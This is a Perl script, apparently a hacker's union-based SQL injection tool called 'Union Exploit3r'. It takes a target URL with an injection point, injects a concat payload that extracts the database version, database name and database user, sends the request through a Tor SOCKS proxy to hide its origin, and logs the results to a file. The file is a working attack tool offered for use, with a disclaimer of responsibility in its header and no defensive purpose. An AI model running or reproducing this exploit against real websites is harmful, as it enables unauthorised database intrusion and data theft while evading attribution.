#!/usr/bin/perl
# by CrashBandicot
# Im not Reponsable of your Act

use LWP::UserAgent;
use HTTP::Request;
use LWP::Protocol::socks;
use Getopt::Long;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();

    print q {   

    	    	db    db d88888b 
    	    	88    88 88'     
    	    	88    88 88ooooo 
    	    	88    88 88~~~~~ 
    	    	88b  d88 88.     
    	    	~Y8888P' Y88888P   

    	    	Union Exploit3r                                                                               

    };

GetOptions(
    'url|u=s' => \$url,
) || &Help();

     my $site = $url;
     my $ev = "--";

     my $DB = "concat(0x4279437234736842346e4469633074,version(),0x4279437234736842346e4469633074,database(),0x4279437234736842346e4469633074,user(),0x4279437234736842346e4469633074)";
	 if ($site =~ /(.*)1337(.*)/i)
     {
     	print "\n[+] Info Getting, Scan Started At ".$hour.":".$min.":".$sec."....\n\n";
         my $newlink = $1.$DB.$2.$ev;
         my $ua = LWP::UserAgent->new( ssl_opts => { verify_hostname => 0 }, agent => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
		 $ua->proxy([qw/ http https /] => 'socks://127.0.0.1:9150'); #TOR
	     my $request = $ua->get($newlink);
	     my $content = $request->content;
         if ($content =~ /ByCr4shB4nDic0t(.*)ByCr4shB4nDic0t(.*)ByCr4shB4nDic0t(.*)ByCr4shB4nDic0t/)
         {					  

                 xsave("[!] Database Version  : $1\n");
                 xsave("[!] Database Name     : $2\n");
                 xsave("[!] DB UserName       : $3\n\n");

                 print "\n[+] Result Saved to SQl_Log.txt\n";
			 } else { 
		 
		 die("[-] FAIL\n"); }
	  }
	 else { die("[+] Please Enter the target this way :\n http://target.net/page.php?id=0+union+select+1,2,1337,3\n");	 }


	sub xsave {
    my $value = $_[0];
    open(LOG,">>SQl_Log.txt") or die(" [!] Cannot create or open log file.\n");
    print LOG "$value";
    close(LOG);
    print $value;
}

sub Help {
    print "\n[*] Union EXploit3r \n";
    print "[*] Coder : CrashBandicot\n";
    print "[+] Usage :\n";
    print "[!] $0 -u | website (Target to test).\n";
    print "\nExample: $0 -u http://target.net/page.php?id=0+union+select+1,2,1337,3 -t\n\n";
   
}
